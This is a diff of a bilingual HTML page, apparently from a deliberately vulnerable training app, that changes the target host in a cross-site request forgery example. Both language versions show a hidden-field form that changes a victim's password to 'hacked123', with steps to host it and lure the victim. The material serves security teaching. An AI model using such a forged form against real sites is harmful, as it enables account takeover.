@@ -47,7 +47,7 @@
       <li>Crea una página HTML maliciosa en tu servidor y haz que la víctima la visite:</li>
     </ol>
     <pre>&lt;!-- evil.html --&gt;
-&lt;form action="http://localhost:5000/csrf/change-password" method="POST"&gt;
+&lt;form action="http://{{ request.host }}/csrf/change-password" method="POST"&gt;
   &lt;input type="hidden" name="user_id" value="2" /&gt;
   &lt;input type="hidden" name="new_password" value="hacked123" /&gt;
 &lt;/form&gt;
@@ -67,7 +67,7 @@
       <li>Create a malicious HTML page on your server and get the victim to visit it:</li>
     </ol>
     <pre>&lt;!-- evil.html --&gt;
-&lt;form action="http://localhost:5000/csrf/change-password" method="POST"&gt;
+&lt;form action="http://{{ request.host }}/csrf/change-password" method="POST"&gt;
   &lt;input type="hidden" name="user_id" value="2" /&gt;
   &lt;input type="hidden" name="new_password" value="hacked123" /&gt;
 &lt;/form&gt;
